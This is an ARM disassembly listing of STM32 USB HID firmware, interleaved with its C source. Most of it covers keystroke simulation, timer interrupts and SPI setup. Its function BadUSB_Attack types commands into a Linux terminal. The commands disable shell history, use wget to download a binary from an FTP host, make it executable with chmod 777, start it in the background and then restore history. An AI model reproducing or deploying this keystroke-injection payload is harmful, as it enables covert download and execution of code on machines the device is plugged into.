 8000a60:	781a      	ldrb	r2, [r3, #0]
 8000a62:	7bfb      	ldrb	r3, [r7, #15]
 8000a64:	6879      	ldr	r1, [r7, #4]
 8000a66:	440b      	add	r3, r1
 8000a68:	f022 0208 	bic.w	r2, r2, #8
 8000a6c:	b2d2      	uxtb	r2, r2
 8000a6e:	701a      	strb	r2, [r3, #0]
		LowerCaseMap[cnt+'a'-'A'] |= 0x08;
 8000a70:	7bfb      	ldrb	r3, [r7, #15]
 8000a72:	3320      	adds	r3, #32
 8000a74:	687a      	ldr	r2, [r7, #4]
 8000a76:	4413      	add	r3, r2
 8000a78:	781a      	ldrb	r2, [r3, #0]
 8000a7a:	7bfb      	ldrb	r3, [r7, #15]
 8000a7c:	3320      	adds	r3, #32
 8000a7e:	6879      	ldr	r1, [r7, #4]
 8000a80:	440b      	add	r3, r1
 8000a82:	f042 0208 	orr.w	r2, r2, #8
 8000a86:	b2d2      	uxtb	r2, r2
 8000a88:	701a      	strb	r2, [r3, #0]
	for(uint8_t cnt = 'A'; cnt <= 'Z'; cnt++){
 8000a8a:	7bfb      	ldrb	r3, [r7, #15]
 8000a8c:	3301      	adds	r3, #1
 8000a8e:	73fb      	strb	r3, [r7, #15]
 8000a90:	7bfb      	ldrb	r3, [r7, #15]
 8000a92:	2b5a      	cmp	r3, #90	; 0x5a
 8000a94:	d9e1      	bls.n	8000a5a <Convert2CapsMap+0xe>
	}
}
 8000a96:	bf00      	nop
 8000a98:	bf00      	nop
 8000a9a:	3714      	adds	r7, #20
 8000a9c:	46bd      	mov	sp, r7
 8000a9e:	f85d 7b04 	ldr.w	r7, [sp], #4
 8000aa2:	4770      	bx	lr

08000aa4 <InterruptTrap>:

void InterruptTrap(int *InterruptFlag){
 8000aa4:	b580      	push	{r7, lr}
 8000aa6:	b082      	sub	sp, #8
 8000aa8:	af00      	add	r7, sp, #0
 8000aaa:	6078      	str	r0, [r7, #4]
	if(*InterruptFlag == 1){
 8000aac:	687b      	ldr	r3, [r7, #4]
 8000aae:	681b      	ldr	r3, [r3, #0]
 8000ab0:	2b01      	cmp	r3, #1
 8000ab2:	d10f      	bne.n	8000ad4 <InterruptTrap+0x30>
		*InterruptFlag = 0;
 8000ab4:	687b      	ldr	r3, [r7, #4]
 8000ab6:	2200      	movs	r2, #0
 8000ab8:	601a      	str	r2, [r3, #0]
		//Trigger timer interrupt immediately by setting the value of the register
		TIM2->EGR |= TIM_EGR_UG;
 8000aba:	f04f 4380 	mov.w	r3, #1073741824	; 0x40000000
 8000abe:	695b      	ldr	r3, [r3, #20]
 8000ac0:	f04f 4280 	mov.w	r2, #1073741824	; 0x40000000
 8000ac4:	f043 0301 	orr.w	r3, r3, #1
 8000ac8:	6153      	str	r3, [r2, #20]
		//Second entry interrupt
		MX_TIM2_Init();
 8000aca:	f000 fab1 	bl	8001030 <MX_TIM2_Init>
		HAL_TIM_Base_Start_IT(&htim2);
 8000ace:	4803      	ldr	r0, [pc, #12]	; (8000adc <InterruptTrap+0x38>)
 8000ad0:	f004 f9fa 	bl	8004ec8 <HAL_TIM_Base_Start_IT>
	}
}
 8000ad4:	bf00      	nop
 8000ad6:	3708      	adds	r7, #8
 8000ad8:	46bd      	mov	sp, r7
 8000ada:	bd80      	pop	{r7, pc}
 8000adc:	200002e4 	.word	0x200002e4

08000ae0 <TestHID>:

int TestHID(){
 8000ae0:	b580      	push	{r7, lr}
 8000ae2:	b082      	sub	sp, #8
 8000ae4:	af00      	add	r7, sp, #0
	char testStr[4] = {133, 133, 133, 133};
 8000ae6:	f04f 3385 	mov.w	r3, #2240120197	; 0x85858585
 8000aea:	603b      	str	r3, [r7, #0]
	SimulateKeyStroke(133);
 8000aec:	2085      	movs	r0, #133	; 0x85
 8000aee:	f7ff ff2d 	bl	800094c <SimulateKeyStroke>
	uint8_t PrevState = recv_buffer[0]&0x01;
 8000af2:	4b0d      	ldr	r3, [pc, #52]	; (8000b28 <TestHID+0x48>)
 8000af4:	781b      	ldrb	r3, [r3, #0]
 8000af6:	f003 0301 	and.w	r3, r3, #1
 8000afa:	71fb      	strb	r3, [r7, #7]
	SimulateKeyStrokes(testStr, 4, &PrintCnt);
 8000afc:	463b      	mov	r3, r7
 8000afe:	4a0b      	ldr	r2, [pc, #44]	; (8000b2c <TestHID+0x4c>)
 8000b00:	2104      	movs	r1, #4
 8000b02:	4618      	mov	r0, r3
 8000b04:	f7ff ff64 	bl	80009d0 <SimulateKeyStrokes>
	uint8_t CurrState = recv_buffer[0]&0x01;
 8000b08:	4b07      	ldr	r3, [pc, #28]	; (8000b28 <TestHID+0x48>)
 8000b0a:	781b      	ldrb	r3, [r3, #0]
 8000b0c:	f003 0301 	and.w	r3, r3, #1
 8000b10:	71bb      	strb	r3, [r7, #6]
	return PrevState == CurrState;
 8000b12:	79fa      	ldrb	r2, [r7, #7]
 8000b14:	79bb      	ldrb	r3, [r7, #6]
 8000b16:	429a      	cmp	r2, r3
 8000b18:	bf0c      	ite	eq
 8000b1a:	2301      	moveq	r3, #1
 8000b1c:	2300      	movne	r3, #0
 8000b1e:	b2db      	uxtb	r3, r3
}
 8000b20:	4618      	mov	r0, r3
 8000b22:	3708      	adds	r7, #8
 8000b24:	46bd      	mov	sp, r7
 8000b26:	bd80      	pop	{r7, pc}
 8000b28:	2000026c 	.word	0x2000026c
 8000b2c:	20000278 	.word	0x20000278

08000b30 <BadUSB_Attack>:

void BadUSB_Attack(int stage){
 8000b30:	b5f0      	push	{r4, r5, r6, r7, lr}
 8000b32:	b0c5      	sub	sp, #276	; 0x114
 8000b34:	af00      	add	r7, sp, #0
 8000b36:	f507 7388 	add.w	r3, r7, #272	; 0x110
 8000b3a:	f5a3 7386 	sub.w	r3, r3, #268	; 0x10c
 8000b3e:	6018      	str	r0, [r3, #0]
#if Target == FPGA
	if(stage == 0){
 8000b40:	f507 7388 	add.w	r3, r7, #272	; 0x110
 8000b44:	f5a3 7386 	sub.w	r3, r3, #268	; 0x10c
 8000b48:	681b      	ldr	r3, [r3, #0]
 8000b4a:	2b00      	cmp	r3, #0
 8000b4c:	d171      	bne.n	8000c32 <BadUSB_Attack+0x102>
		uint8_t Terminal[3] = LinuxTerminal;
 8000b4e:	4a8c      	ldr	r2, [pc, #560]	; (8000d80 <BadUSB_Attack+0x250>)
 8000b50:	f507 7386 	add.w	r3, r7, #268	; 0x10c
 8000b54:	6812      	ldr	r2, [r2, #0]
 8000b56:	4611      	mov	r1, r2
 8000b58:	8019      	strh	r1, [r3, #0]
 8000b5a:	3302      	adds	r3, #2
 8000b5c:	0c12      	lsrs	r2, r2, #16
 8000b5e:	701a      	strb	r2, [r3, #0]
		char AttackStr0[256] = {'\0'};
 8000b60:	f507 7388 	add.w	r3, r7, #272	; 0x110
 8000b64:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8000b68:	2200      	movs	r2, #0
 8000b6a:	601a      	str	r2, [r3, #0]
 8000b6c:	3304      	adds	r3, #4
 8000b6e:	22fc      	movs	r2, #252	; 0xfc
 8000b70:	2100      	movs	r1, #0
 8000b72:	4618      	mov	r0, r3
 8000b74:	f00c fb10 	bl	800d198 <memset>
		strcat(AttackStr0, "set +o history\n");
 8000b78:	f107 0308 	add.w	r3, r7, #8
 8000b7c:	4618      	mov	r0, r3
 8000b7e:	f7ff fb25 	bl	80001cc <strlen>
 8000b82:	4603      	mov	r3, r0
 8000b84:	461a      	mov	r2, r3
 8000b86:	f107 0308 	add.w	r3, r7, #8
 8000b8a:	4413      	add	r3, r2
 8000b8c:	4a7d      	ldr	r2, [pc, #500]	; (8000d84 <BadUSB_Attack+0x254>)
 8000b8e:	461c      	mov	r4, r3
 8000b90:	4615      	mov	r5, r2
 8000b92:	cd0f      	ldmia	r5!, {r0, r1, r2, r3}
 8000b94:	6020      	str	r0, [r4, #0]
 8000b96:	6061      	str	r1, [r4, #4]
 8000b98:	60a2      	str	r2, [r4, #8]
 8000b9a:	60e3      	str	r3, [r4, #12]
		strcat(AttackStr0, "cd /home/user/Templates\n");
 8000b9c:	f107 0308 	add.w	r3, r7, #8
 8000ba0:	4618      	mov	r0, r3
 8000ba2:	f7ff fb13 	bl	80001cc <strlen>
 8000ba6:	4603      	mov	r3, r0
 8000ba8:	461a      	mov	r2, r3
 8000baa:	f107 0308 	add.w	r3, r7, #8
 8000bae:	4413      	add	r3, r2
 8000bb0:	4a75      	ldr	r2, [pc, #468]	; (8000d88 <BadUSB_Attack+0x258>)
 8000bb2:	461d      	mov	r5, r3
 8000bb4:	4614      	mov	r4, r2
 8000bb6:	cc0f      	ldmia	r4!, {r0, r1, r2, r3}
 8000bb8:	6028      	str	r0, [r5, #0]
 8000bba:	6069      	str	r1, [r5, #4]
 8000bbc:	60aa      	str	r2, [r5, #8]
 8000bbe:	60eb      	str	r3, [r5, #12]
 8000bc0:	cc03      	ldmia	r4!, {r0, r1}
 8000bc2:	6128      	str	r0, [r5, #16]
 8000bc4:	6169      	str	r1, [r5, #20]
 8000bc6:	7823      	ldrb	r3, [r4, #0]
 8000bc8:	762b      	strb	r3, [r5, #24]
		strcat(AttackStr0, "wget -q ftp://anonymous:@192.168.59.207/MSCDrv >/dev/null 2>&1 &\n");
 8000bca:	f107 0308 	add.w	r3, r7, #8
 8000bce:	4618      	mov	r0, r3
 8000bd0:	f7ff fafc 	bl	80001cc <strlen>
 8000bd4:	4603      	mov	r3, r0
 8000bd6:	461a      	mov	r2, r3
 8000bd8:	f107 0308 	add.w	r3, r7, #8
 8000bdc:	4413      	add	r3, r2
 8000bde:	4a6b      	ldr	r2, [pc, #428]	; (8000d8c <BadUSB_Attack+0x25c>)
 8000be0:	4618      	mov	r0, r3
 8000be2:	4611      	mov	r1, r2
 8000be4:	2342      	movs	r3, #66	; 0x42
 8000be6:	461a      	mov	r2, r3
 8000be8:	f00c fb02 	bl	800d1f0 <memcpy>
		strcat(AttackStr0, "exit\n");
 8000bec:	f107 0308 	add.w	r3, r7, #8
 8000bf0:	4618      	mov	r0, r3
 8000bf2:	f7ff faeb 	bl	80001cc <strlen>
 8000bf6:	4603      	mov	r3, r0
 8000bf8:	461a      	mov	r2, r3
 8000bfa:	f107 0308 	add.w	r3, r7, #8
 8000bfe:	4413      	add	r3, r2
 8000c00:	4a63      	ldr	r2, [pc, #396]	; (8000d90 <BadUSB_Attack+0x260>)
 8000c02:	6810      	ldr	r0, [r2, #0]
 8000c04:	6018      	str	r0, [r3, #0]
 8000c06:	8892      	ldrh	r2, [r2, #4]
 8000c08:	809a      	strh	r2, [r3, #4]
		SimulateShortcutKey(Terminal, 3);
 8000c0a:	f507 7386 	add.w	r3, r7, #268	; 0x10c
 8000c0e:	2103      	movs	r1, #3
 8000c10:	4618      	mov	r0, r3
 8000c12:	f7ff feb1 	bl	8000978 <SimulateShortcutKey>
		SimulateKeyStrokes(AttackStr0, strlen(AttackStr0), &PrintCnt);
 8000c16:	f107 0308 	add.w	r3, r7, #8
 8000c1a:	4618      	mov	r0, r3
 8000c1c:	f7ff fad6 	bl	80001cc <strlen>
 8000c20:	4603      	mov	r3, r0
 8000c22:	4619      	mov	r1, r3
 8000c24:	f107 0308 	add.w	r3, r7, #8
 8000c28:	4a5a      	ldr	r2, [pc, #360]	; (8000d94 <BadUSB_Attack+0x264>)
 8000c2a:	4618      	mov	r0, r3
 8000c2c:	f7ff fed0 	bl	80009d0 <SimulateKeyStrokes>
		char AttackStr[256];
		strcpy(AttackStr, "!@#$%^&*()_+1234567890~`{}|:\"<>?[];',./ashdahskdhasjdeuwhuASDJDHJAJKDHBSXAHE\n");
		SimulateKeyStrokes(AttackStr, strlen(AttackStr), &PrintCnt);
	}
#endif
}
 8000c30:	e0a1      	b.n	8000d76 <BadUSB_Attack+0x246>
	}else if(stage == 1){
 8000c32:	f507 7388 	add.w	r3, r7, #272	; 0x110
 8000c36:	f5a3 7386 	sub.w	r3, r3, #268	; 0x10c
 8000c3a:	681b      	ldr	r3, [r3, #0]
 8000c3c:	2b01      	cmp	r3, #1
 8000c3e:	f040 8084 	bne.w	8000d4a <BadUSB_Attack+0x21a>
		uint8_t Terminal[3] = LinuxTerminal;
 8000c42:	4a4f      	ldr	r2, [pc, #316]	; (8000d80 <BadUSB_Attack+0x250>)
 8000c44:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8000c48:	6812      	ldr	r2, [r2, #0]
 8000c4a:	4611      	mov	r1, r2
 8000c4c:	8019      	strh	r1, [r3, #0]
 8000c4e:	3302      	adds	r3, #2
 8000c50:	0c12      	lsrs	r2, r2, #16
 8000c52:	701a      	strb	r2, [r3, #0]
		char AttackStr1[256] = {'\0'};
 8000c54:	f507 7388 	add.w	r3, r7, #272	; 0x110
 8000c58:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8000c5c:	2200      	movs	r2, #0
 8000c5e:	601a      	str	r2, [r3, #0]
 8000c60:	3304      	adds	r3, #4
 8000c62:	22fc      	movs	r2, #252	; 0xfc
 8000c64:	2100      	movs	r1, #0
 8000c66:	4618      	mov	r0, r3
 8000c68:	f00c fa96 	bl	800d198 <memset>
		strcat(AttackStr1, "cd /home/user/Templates\n");
 8000c6c:	f107 0308 	add.w	r3, r7, #8
 8000c70:	4618      	mov	r0, r3
 8000c72:	f7ff faab 	bl	80001cc <strlen>
 8000c76:	4603      	mov	r3, r0
 8000c78:	461a      	mov	r2, r3
 8000c7a:	f107 0308 	add.w	r3, r7, #8
 8000c7e:	4413      	add	r3, r2
 8000c80:	4a41      	ldr	r2, [pc, #260]	; (8000d88 <BadUSB_Attack+0x258>)
 8000c82:	461d      	mov	r5, r3
 8000c84:	4614      	mov	r4, r2
 8000c86:	cc0f      	ldmia	r4!, {r0, r1, r2, r3}
 8000c88:	6028      	str	r0, [r5, #0]
 8000c8a:	6069      	str	r1, [r5, #4]
 8000c8c:	60aa      	str	r2, [r5, #8]
 8000c8e:	60eb      	str	r3, [r5, #12]
 8000c90:	cc03      	ldmia	r4!, {r0, r1}
 8000c92:	6128      	str	r0, [r5, #16]
 8000c94:	6169      	str	r1, [r5, #20]
 8000c96:	7823      	ldrb	r3, [r4, #0]
 8000c98:	762b      	strb	r3, [r5, #24]
		strcat(AttackStr1, "chmod 777 MSCDrv\n./MSCDrv >/dev/null 2>&1 &\n");
 8000c9a:	f107 0308 	add.w	r3, r7, #8
 8000c9e:	4618      	mov	r0, r3
 8000ca0:	f7ff fa94 	bl	80001cc <strlen>
 8000ca4:	4603      	mov	r3, r0
 8000ca6:	461a      	mov	r2, r3
 8000ca8:	f107 0308 	add.w	r3, r7, #8
 8000cac:	4413      	add	r3, r2
 8000cae:	4a3a      	ldr	r2, [pc, #232]	; (8000d98 <BadUSB_Attack+0x268>)
 8000cb0:	4614      	mov	r4, r2
 8000cb2:	469c      	mov	ip, r3
 8000cb4:	f104 0e20 	add.w	lr, r4, #32
 8000cb8:	4665      	mov	r5, ip
 8000cba:	4626      	mov	r6, r4
 8000cbc:	ce0f      	ldmia	r6!, {r0, r1, r2, r3}
 8000cbe:	6028      	str	r0, [r5, #0]
 8000cc0:	6069      	str	r1, [r5, #4]
 8000cc2:	60aa      	str	r2, [r5, #8]
 8000cc4:	60eb      	str	r3, [r5, #12]
 8000cc6:	3410      	adds	r4, #16
 8000cc8:	f10c 0c10 	add.w	ip, ip, #16
 8000ccc:	4574      	cmp	r4, lr
 8000cce:	d1f3      	bne.n	8000cb8 <BadUSB_Attack+0x188>
 8000cd0:	4665      	mov	r5, ip
 8000cd2:	4623      	mov	r3, r4
 8000cd4:	cb07      	ldmia	r3!, {r0, r1, r2}
 8000cd6:	6028      	str	r0, [r5, #0]
 8000cd8:	6069      	str	r1, [r5, #4]
 8000cda:	60aa      	str	r2, [r5, #8]
 8000cdc:	781b      	ldrb	r3, [r3, #0]
 8000cde:	732b      	strb	r3, [r5, #12]
		strcat(AttackStr1, "set -o history\n");
 8000ce0:	f107 0308 	add.w	r3, r7, #8
 8000ce4:	4618      	mov	r0, r3
 8000ce6:	f7ff fa71 	bl	80001cc <strlen>
 8000cea:	4603      	mov	r3, r0
 8000cec:	461a      	mov	r2, r3
 8000cee:	f107 0308 	add.w	r3, r7, #8
 8000cf2:	4413      	add	r3, r2
 8000cf4:	4a29      	ldr	r2, [pc, #164]	; (8000d9c <BadUSB_Attack+0x26c>)
 8000cf6:	461c      	mov	r4, r3
 8000cf8:	4615      	mov	r5, r2
 8000cfa:	cd0f      	ldmia	r5!, {r0, r1, r2, r3}
 8000cfc:	6020      	str	r0, [r4, #0]
 8000cfe:	6061      	str	r1, [r4, #4]
 8000d00:	60a2      	str	r2, [r4, #8]
 8000d02:	60e3      	str	r3, [r4, #12]
		strcat(AttackStr1, "exit\n");
 8000d04:	f107 0308 	add.w	r3, r7, #8
 8000d08:	4618      	mov	r0, r3
 8000d0a:	f7ff fa5f 	bl	80001cc <strlen>
 8000d0e:	4603      	mov	r3, r0
 8000d10:	461a      	mov	r2, r3
 8000d12:	f107 0308 	add.w	r3, r7, #8
 8000d16:	4413      	add	r3, r2
 8000d18:	4a1d      	ldr	r2, [pc, #116]	; (8000d90 <BadUSB_Attack+0x260>)
 8000d1a:	6810      	ldr	r0, [r2, #0]
 8000d1c:	6018      	str	r0, [r3, #0]
 8000d1e:	8892      	ldrh	r2, [r2, #4]
 8000d20:	809a      	strh	r2, [r3, #4]
		SimulateShortcutKey(Terminal, 3);
 8000d22:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8000d26:	2103      	movs	r1, #3
 8000d28:	4618      	mov	r0, r3
 8000d2a:	f7ff fe25 	bl	8000978 <SimulateShortcutKey>
		SimulateKeyStrokes(AttackStr1, strlen(AttackStr1), &PrintCnt);
 8000d2e:	f107 0308 	add.w	r3, r7, #8
 8000d32:	4618      	mov	r0, r3
 8000d34:	f7ff fa4a 	bl	80001cc <strlen>
 8000d38:	4603      	mov	r3, r0
 8000d3a:	4619      	mov	r1, r3
 8000d3c:	f107 0308 	add.w	r3, r7, #8
 8000d40:	4a14      	ldr	r2, [pc, #80]	; (8000d94 <BadUSB_Attack+0x264>)
 8000d42:	4618      	mov	r0, r3
 8000d44:	f7ff fe44 	bl	80009d0 <SimulateKeyStrokes>
}
 8000d48:	e015      	b.n	8000d76 <BadUSB_Attack+0x246>
		strcpy(AttackStr, "!@#$%^&*()_+1234567890~`{}|:\"<>?[];',./ashdahskdhasjdeuwhuASDJDHJAJKDHBSXAHE\n");
 8000d4a:	f107 0308 	add.w	r3, r7, #8
 8000d4e:	4a14      	ldr	r2, [pc, #80]	; (8000da0 <BadUSB_Attack+0x270>)
 8000d50:	4618      	mov	r0, r3
 8000d52:	4611      	mov	r1, r2
 8000d54:	234e      	movs	r3, #78	; 0x4e
 8000d56:	461a      	mov	r2, r3
 8000d58:	f00c fa4a 	bl	800d1f0 <memcpy>
		SimulateKeyStrokes(AttackStr, strlen(AttackStr), &PrintCnt);
 8000d5c:	f107 0308 	add.w	r3, r7, #8
 8000d60:	4618      	mov	r0, r3
 8000d62:	f7ff fa33 	bl	80001cc <strlen>
 8000d66:	4603      	mov	r3, r0
 8000d68:	4619      	mov	r1, r3
 8000d6a:	f107 0308 	add.w	r3, r7, #8
 8000d6e:	4a09      	ldr	r2, [pc, #36]	; (8000d94 <BadUSB_Attack+0x264>)
 8000d70:	4618      	mov	r0, r3
 8000d72:	f7ff fe2d 	bl	80009d0 <SimulateKeyStrokes>
}
 8000d76:	bf00      	nop
 8000d78:	f507 778a 	add.w	r7, r7, #276	; 0x114
 8000d7c:	46bd      	mov	sp, r7
 8000d7e:	bdf0      	pop	{r4, r5, r6, r7, pc}
 8000d80:	0800d3b4 	.word	0x0800d3b4
 8000d84:	0800d2ac 	.word	0x0800d2ac
 8000d88:	0800d2bc 	.word	0x0800d2bc
 8000d8c:	0800d2d8 	.word	0x0800d2d8
 8000d90:	0800d31c 	.word	0x0800d31c
 8000d94:	20000278 	.word	0x20000278
 8000d98:	0800d324 	.word	0x0800d324
 8000d9c:	0800d354 	.word	0x0800d354
 8000da0:	0800d364 	.word	0x0800d364

08000da4 <HAL_TIM_PeriodElapsedCallback>:

void HAL_TIM_PeriodElapsedCallback(TIM_HandleTypeDef *htim){
 8000da4:	b580      	push	{r7, lr}
 8000da6:	b082      	sub	sp, #8
 8000da8:	af00      	add	r7, sp, #0
 8000daa:	6078      	str	r0, [r7, #4]
	if(htim == &htim2){
 8000dac:	687b      	ldr	r3, [r7, #4]
 8000dae:	4a1d      	ldr	r2, [pc, #116]	; (8000e24 <HAL_TIM_PeriodElapsedCallback+0x80>)
 8000db0:	4293      	cmp	r3, r2
 8000db2:	d133      	bne.n	8000e1c <HAL_TIM_PeriodElapsedCallback+0x78>
		if(InterruptCnt == 0){
 8000db4:	4b1c      	ldr	r3, [pc, #112]	; (8000e28 <HAL_TIM_PeriodElapsedCallback+0x84>)
 8000db6:	681b      	ldr	r3, [r3, #0]
 8000db8:	2b00      	cmp	r3, #0
 8000dba:	d108      	bne.n	8000dce <HAL_TIM_PeriodElapsedCallback+0x2a>
			//Simulate press operation
			Get_Single_Descriptor(128);
 8000dbc:	2080      	movs	r0, #128	; 0x80
 8000dbe:	f7ff fcef 	bl	80007a0 <Get_Single_Descriptor>
			USBD_CUSTOM_HID_SendReport(&hUsbDeviceFS, sent_buffer, USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
 8000dc2:	220f      	movs	r2, #15
 8000dc4:	4919      	ldr	r1, [pc, #100]	; (8000e2c <HAL_TIM_PeriodElapsedCallback+0x88>)
 8000dc6:	481a      	ldr	r0, [pc, #104]	; (8000e30 <HAL_TIM_PeriodElapsedCallback+0x8c>)
 8000dc8:	f007 feec 	bl	8008ba4 <USBD_CUSTOM_HID_SendReport>
 8000dcc:	e018      	b.n	8000e00 <HAL_TIM_PeriodElapsedCallback+0x5c>
//			HAL_GPIO_WritePin(GPIOB, GPIO_PIN_3, GPIO_PIN_SET);
		}else if(InterruptCnt == 1){
 8000dce:	4b16      	ldr	r3, [pc, #88]	; (8000e28 <HAL_TIM_PeriodElapsedCallback+0x84>)
 8000dd0:	681b      	ldr	r3, [r3, #0]
 8000dd2:	2b01      	cmp	r3, #1
 8000dd4:	d10c      	bne.n	8000df0 <HAL_TIM_PeriodElapsedCallback+0x4c>
			//Simulate release operation
			SimulateKeyRelease();
 8000dd6:	f7ff fda7 	bl	8000928 <SimulateKeyRelease>
			//Judging whether to Interrupt
			if((recv_buffer[0]&0x02) != 0x02)
 8000dda:	4b16      	ldr	r3, [pc, #88]	; (8000e34 <HAL_TIM_PeriodElapsedCallback+0x90>)
 8000ddc:	781b      	ldrb	r3, [r3, #0]
 8000dde:	f003 0302 	and.w	r3, r3, #2
 8000de2:	2b00      	cmp	r3, #0
 8000de4:	d10c      	bne.n	8000e00 <HAL_TIM_PeriodElapsedCallback+0x5c>
				InterruptCnt = -1;
 8000de6:	4b10      	ldr	r3, [pc, #64]	; (8000e28 <HAL_TIM_PeriodElapsedCallback+0x84>)
 8000de8:	f04f 32ff 	mov.w	r2, #4294967295
 8000dec:	601a      	str	r2, [r3, #0]
 8000dee:	e007      	b.n	8000e00 <HAL_TIM_PeriodElapsedCallback+0x5c>
//			HAL_GPIO_WritePin(GPIOB, GPIO_PIN_3, GPIO_PIN_RESET);
		}else{
			//off timer
			TIM2->CR1 &= ~TIM_CR1_CEN;
 8000df0:	f04f 4380 	mov.w	r3, #1073741824	; 0x40000000
 8000df4:	681b      	ldr	r3, [r3, #0]
 8000df6:	f04f 4280 	mov.w	r2, #1073741824	; 0x40000000
 8000dfa:	f023 0301 	bic.w	r3, r3, #1
 8000dfe:	6013      	str	r3, [r2, #0]
		}
		InterruptCnt = (InterruptCnt+1)%3;
 8000e00:	4b09      	ldr	r3, [pc, #36]	; (8000e28 <HAL_TIM_PeriodElapsedCallback+0x84>)
 8000e02:	681b      	ldr	r3, [r3, #0]
 8000e04:	1c59      	adds	r1, r3, #1
 8000e06:	4b0c      	ldr	r3, [pc, #48]	; (8000e38 <HAL_TIM_PeriodElapsedCallback+0x94>)
 8000e08:	fb83 3201 	smull	r3, r2, r3, r1
 8000e0c:	17cb      	asrs	r3, r1, #31
 8000e0e:	1ad2      	subs	r2, r2, r3
 8000e10:	4613      	mov	r3, r2
 8000e12:	005b      	lsls	r3, r3, #1
 8000e14:	4413      	add	r3, r2
 8000e16:	1aca      	subs	r2, r1, r3
 8000e18:	4b03      	ldr	r3, [pc, #12]	; (8000e28 <HAL_TIM_PeriodElapsedCallback+0x84>)
 8000e1a:	601a      	str	r2, [r3, #0]
	}
}
 8000e1c:	bf00      	nop
 8000e1e:	3708      	adds	r7, #8
 8000e20:	46bd      	mov	sp, r7
 8000e22:	bd80      	pop	{r7, pc}
 8000e24:	200002e4 	.word	0x200002e4
 8000e28:	20000274 	.word	0x20000274
 8000e2c:	2000025c 	.word	0x2000025c
 8000e30:	200003c0 	.word	0x200003c0
 8000e34:	2000026c 	.word	0x2000026c
 8000e38:	55555556 	.word	0x55555556

08000e3c <Error_Handler>:
/**
  * @brief  This function is executed in case of error occurrence.
  * @retval None
  */
void Error_Handler(void)
{
 8000e3c:	b480      	push	{r7}
 8000e3e:	af00      	add	r7, sp, #0
  \details Disables IRQ interrupts by setting the I-bit in the CPSR.
           Can only be executed in Privileged modes.
 */
__STATIC_FORCEINLINE void __disable_irq(void)
{
  __ASM volatile ("cpsid i" : : : "memory");
 8000e40:	b672      	cpsid	i
}
 8000e42:	bf00      	nop
  /* USER CODE BEGIN Error_Handler_Debug */
  /* User can add his own implementation to report the HAL error return state */
  __disable_irq();
  while (1)
 8000e44:	e7fe      	b.n	8000e44 <Error_Handler+0x8>
	...

08000e48 <MX_SPI1_Init>:

SPI_HandleTypeDef hspi1;

/* SPI1 init function */
void MX_SPI1_Init(void)
{
 8000e48:	b580      	push	{r7, lr}
 8000e4a:	af00      	add	r7, sp, #0
  /* USER CODE END SPI1_Init 0 */

  /* USER CODE BEGIN SPI1_Init 1 */

  /* USER CODE END SPI1_Init 1 */
  hspi1.Instance = SPI1;
 8000e4c:	4b1b      	ldr	r3, [pc, #108]	; (8000ebc <MX_SPI1_Init+0x74>)
 8000e4e:	4a1c      	ldr	r2, [pc, #112]	; (8000ec0 <MX_SPI1_Init+0x78>)
 8000e50:	601a      	str	r2, [r3, #0]
  hspi1.Init.Mode = SPI_MODE_MASTER;
 8000e52:	4b1a      	ldr	r3, [pc, #104]	; (8000ebc <MX_SPI1_Init+0x74>)
 8000e54:	f44f 7282 	mov.w	r2, #260	; 0x104
 8000e58:	605a      	str	r2, [r3, #4]
  hspi1.Init.Direction = SPI_DIRECTION_2LINES;
 8000e5a:	4b18      	ldr	r3, [pc, #96]	; (8000ebc <MX_SPI1_Init+0x74>)
 8000e5c:	2200      	movs	r2, #0
 8000e5e:	609a      	str	r2, [r3, #8]
  hspi1.Init.DataSize = SPI_DATASIZE_8BIT;
 8000e60:	4b16      	ldr	r3, [pc, #88]	; (8000ebc <MX_SPI1_Init+0x74>)
 8000e62:	f44f 62e0 	mov.w	r2, #1792	; 0x700
 8000e66:	60da      	str	r2, [r3, #12]
  hspi1.Init.CLKPolarity = SPI_POLARITY_LOW;
 8000e68:	4b14      	ldr	r3, [pc, #80]	; (8000ebc <MX_SPI1_Init+0x74>)
 8000e6a:	2200      	movs	r2, #0
 8000e6c:	611a      	str	r2, [r3, #16]
  hspi1.Init.CLKPhase = SPI_PHASE_1EDGE;
 8000e6e:	4b13      	ldr	r3, [pc, #76]	; (8000ebc <MX_SPI1_Init+0x74>)
 8000e70:	2200      	movs	r2, #0
 8000e72:	615a      	str	r2, [r3, #20]
  hspi1.Init.NSS = SPI_NSS_SOFT;
 8000e74:	4b11      	ldr	r3, [pc, #68]	; (8000ebc <MX_SPI1_Init+0x74>)
 8000e76:	f44f 7200 	mov.w	r2, #512	; 0x200
 8000e7a:	619a      	str	r2, [r3, #24]
  hspi1.Init.BaudRatePrescaler = SPI_BAUDRATEPRESCALER_64;
 8000e7c:	4b0f      	ldr	r3, [pc, #60]	; (8000ebc <MX_SPI1_Init+0x74>)
 8000e7e:	2228      	movs	r2, #40	; 0x28
 8000e80:	61da      	str	r2, [r3, #28]
  hspi1.Init.FirstBit = SPI_FIRSTBIT_MSB;
 8000e82:	4b0e      	ldr	r3, [pc, #56]	; (8000ebc <MX_SPI1_Init+0x74>)
 8000e84:	2200      	movs	r2, #0
 8000e86:	621a      	str	r2, [r3, #32]
  hspi1.Init.TIMode = SPI_TIMODE_DISABLE;
 8000e88:	4b0c      	ldr	r3, [pc, #48]	; (8000ebc <MX_SPI1_Init+0x74>)
 8000e8a:	2200      	movs	r2, #0
 8000e8c:	625a      	str	r2, [r3, #36]	; 0x24
  hspi1.Init.CRCCalculation = SPI_CRCCALCULATION_DISABLE;
 8000e8e:	4b0b      	ldr	r3, [pc, #44]	; (8000ebc <MX_SPI1_Init+0x74>)
 8000e90:	2200      	movs	r2, #0
 8000e92:	629a      	str	r2, [r3, #40]	; 0x28
  hspi1.Init.CRCPolynomial = 7;
 8000e94:	4b09      	ldr	r3, [pc, #36]	; (8000ebc <MX_SPI1_Init+0x74>)
 8000e96:	2207      	movs	r2, #7
 8000e98:	62da      	str	r2, [r3, #44]	; 0x2c
  hspi1.Init.CRCLength = SPI_CRC_LENGTH_DATASIZE;
 8000e9a:	4b08      	ldr	r3, [pc, #32]	; (8000ebc <MX_SPI1_Init+0x74>)
 8000e9c:	2200      	movs	r2, #0
 8000e9e:	631a      	str	r2, [r3, #48]	; 0x30
  hspi1.Init.NSSPMode = SPI_NSS_PULSE_ENABLE;
 8000ea0:	4b06      	ldr	r3, [pc, #24]	; (8000ebc <MX_SPI1_Init+0x74>)
